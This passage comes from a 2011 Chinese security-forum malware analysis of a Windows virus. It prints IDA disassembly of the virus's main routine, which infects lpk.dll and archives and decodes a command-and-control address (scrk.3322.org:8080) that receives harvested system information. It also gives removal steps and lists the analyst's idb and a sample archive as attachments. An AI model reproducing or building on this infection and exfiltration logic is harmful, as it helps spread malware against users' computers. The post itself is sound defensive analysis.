
```
.text:004027E6 ; 20:   lpkInfect();

.text:004027E6

.text:004027E6 loc_4027E6:                             ; CODE XREF: sub_402730+A9j

.text:004027E6                 call    lpkInfect

.text:004027EB ; 21:   wsprintfA(&v0, "hra%u.dll", 33);

.text:004027EB                 push    21h

.text:004027ED                 lea     ecx, [esp+14h]

.text:004027F1                 push    offset aHraU_dll ; "hra%u.dll"

.text:004027F6                 push    ecx             ; LPSTR

.text:004027F7                 call    wsprintfA

.text:004027FD ; 22:   sub_402520(&v0);

.text:004027FD                 lea     edx, [esp+1Ch]

.text:00402801                 push    edx             ; pFileName

.text:00402802                 call    sub_402520

.text:00402807 ; 23:   LoadVirusLpk();

.text:00402807                 call    LoadVirusLpk

.text:0040280C ; 24:   decode((int)"s僼婸3344P弔?>6>6", strlen("s僼婸3344P弔?>6>6") - 1, 18);

.text:0040280C                 mov     edi, offset aSgtlp3344pptz66 ; ;  ASCII 

"scrk.3322.org:8080"

.text:0040280C                                         ; 解密以后的字符串

.text:00402811                 or      ecx, 0FFFFFFFFh

.text:00402814                 xor     eax, eax

.text:00402816                 push    12h

.text:00402818                 repne scasb

.text:0040281A                 not     ecx

.text:0040281C                 dec     ecx

.text:0040281D                 push    ecx

.text:0040281E                 push    offset aSgtlp3344pptz66 ; "s僼婸3344P弔?>6>6"

.text:00402823                 call    decode

.text:00402828 ; 25:   WSAStartup(0x202u, (struct WSAData *)((char *)&WSAData + 16));

.text:00402828                 add     esp, 1Ch

.text:0040282B                 lea     eax, [esp+294h+WSAData.szDescription+0Ch]

.text:00402832                 push    eax             ; lpWSAData

.text:00402833                 push    202h            ; wVersionRequested

.text:00402838                 call    WSAStartup

.text:0040283E                 mov     edi, ds:WaitForSingleObject

.text:00402844                 mov     ebx, ds:CloseHandle

.text:0040284A                 mov     ebp, closesocket

.text:00402850 ; 28:     hObject = CreateThraed((LPTHREAD_START_ROUTINE)bAdApple, 0);我对臭苹

果的怨念是世界级的……

.text:00402850

.text:00402850 loc_402850:                             ; CODE XREF: sub_402730+159j

.text:00402850                 push    0               ; lpParameter

.text:00402852                 push    offset bAdApple ; lpStartAddress

.text:00402857                 call    CreateThraed

.text:0040285C ; 29:     WaitForSingleObject(hObject, 0xFFFFFFFFu);

.text:0040285C                 push    0FFFFFFFFh      ; dwMilliseconds

.text:0040285E ; 26:   while ( 1 )

.text:0040285E                 push    eax             ; hHandle

.text:0040285F                 mov     hObject, eax

.text:00402864                 call    edi ; WaitForSingleObject

.text:00402866 ; 30:     CloseHandle(hObject);

.text:00402866                 mov     ecx, hObject

.text:0040286C                 push    ecx             ; hObject

.text:0040286D                 call    ebx ; CloseHandle

.text:0040286F ; 31:     closesocket(s);

.text:0040286F                 mov     edx, s

.text:00402875                 push    edx             ; s

.text:00402876                 call    ebp ; closesocket

.text:00402878 ; 33:     Sleep(0x12Cu);

.text:00402878                 push    12Ch            ; dwMilliseconds

.text:0040287D ; 32:     dword_408634 = 1;

.text:0040287D                 mov     dword_408634, 1

.text:00402887                 call    esi ; Sleep

.text:00402889                 jmp     short loc_402850

```

得到这么个好东西、`scrk.3322.org:8080`。然后就是`CreateThread`干坏事。

坏事回调函数：

```
004019C0   .  81EC C4090000 sub     esp, 9C4
```

此部分比较长了、而且不大会分析、各位有兴趣可以去看我上传的`idb`。然后是一系列获取计算机基本信息、然后寄送到上面解密出来的地址……装载肮脏的Lpk进行感染……

至此全病毒感染模块分析完毕……因为本人是网络白痴、就算见到了网络操作代码也不知道到底是干什么的……囧虚……

此病毒就是启动一个服务、坏事都在服务里做，因为本人也没搞过服务程序开发、所以也不知道这块怎么分析、不过零散的分析大概已经把服务要做的事情都分析出来了……

删除病毒时首先停止病毒服务、然后用`XueTr`删除病毒服务、并且来到`System32`下找到最新更改的`exe`、大概就是那个了、建议用工具删除、因为这个东西连压缩文件都感染了、手工处理不大方便、当然也可以写个工具……

- -讨厌这种用技术干坏事的、鄙视下病毒作者、还真是无聊啊……这种猫和老鼠的游戏大概永远都不会结束吧……

其实说句实话今天分析这个病毒是因为中午帮同学修电脑修坏了……、发泄下、……真是Bug啊……又把别人的`Bootmgr`压缩了……- -刚才已经解决完毕了……所以我也没有必要继续寂寞下去了……娱乐去了、各位晚安。

![](https://bbs.kanxue.com/upload/attach/201102/122145_pxbz938qm7cip1d.png)

游戏CG x1附赠

Azure[LCG]

2011.02.06

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- [idb.rar](javascript:void(0);)

  （241.57kb，78次下载）

- [样本.rar](javascript:void(0);)

  （31.92kb，92次下载）

- [Windows XP SP3-2011-02-06-17-23-11.png](javascript:void(0);)

  （80.83kb，937次下载）

- [Windows XP SP3-2011-02-06-18-06-53.png](javascript:void(0);)

  （76.28kb，933次下载）

- [2011-02-04 17-52-54.png](javascript:void(0);)

  （488.83kb，944次下载）
